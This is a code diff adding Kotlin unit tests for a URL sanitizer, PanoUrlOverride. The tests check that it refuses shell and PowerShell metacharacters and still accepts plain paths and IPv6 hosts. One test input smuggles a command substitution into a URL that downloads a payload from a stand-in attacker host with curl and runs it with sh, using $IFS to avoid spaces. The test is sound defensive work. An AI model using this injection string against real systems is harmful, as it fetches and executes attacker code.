@@ -40,4 +40,22 @@ class PanoUrlOverrideTest {
         assertThrows<BadRequest> { PanoUrlOverride.sanitize("http://not a host/") }
         assertThrows<BadRequest> { PanoUrlOverride.sanitize("https://" + "a".repeat(PanoUrlOverride.MAX_LENGTH)) }
     }
+
+    @Test
+    fun `shell and PowerShell metacharacters are refused`() {
+        listOf(
+            "https://victim.example/\$(curl\$IFS-so/tmp/p\$IFS'evil.tld/p';sh\$IFS/tmp/p)",
+            "https://pano.lan/a'b",
+            "https://pano.lan/a;b",
+            "https://pano.lan/a&b",
+            "https://pano.lan/(x)",
+            "https://pano.lan/%27"
+        ).forEach { raw -> assertThrows<BadRequest>(raw) { PanoUrlOverride.sanitize(raw) } }
+    }
+
+    @Test
+    fun `plain paths and bracketed IPv6 still pass`() {
+        assertEquals("https://pano.lan/sub/dir", PanoUrlOverride.sanitize("https://pano.lan/sub/dir"))
+        assertEquals("http://[::1]:18088", PanoUrlOverride.sanitize("http://[::1]:18088"))
+    }
 }
